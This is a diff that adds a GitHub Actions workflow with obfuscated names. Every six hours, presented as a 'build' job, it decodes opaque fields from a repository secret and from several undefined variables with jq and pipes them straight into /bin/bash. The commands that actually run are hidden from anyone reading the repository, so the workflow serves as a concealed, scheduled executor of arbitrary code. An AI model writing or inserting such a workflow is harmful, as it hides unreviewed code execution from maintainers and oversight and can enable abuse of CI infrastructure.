@@ -1,0 +1,23 @@
+name: wangyinzi1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangyinzi1234
+        env:
+          inj03: ${{ secrets.inj03 }}
+        run: |
+          echo $inj03 | jq -r .eox976 | /bin/bash
+          echo $sqwn47635 | jq -r .oq00432 | /bin/bash
+          echo $nl25 | jq -r .ay76008 | /bin/bash
+          echo $tlfct16136 | jq -r .kf517 | /bin/bash
+          echo $kt354 | jq -r .l2 | /bin/bash
+          echo $p777 | jq -r .ni1 | /bin/bash
+
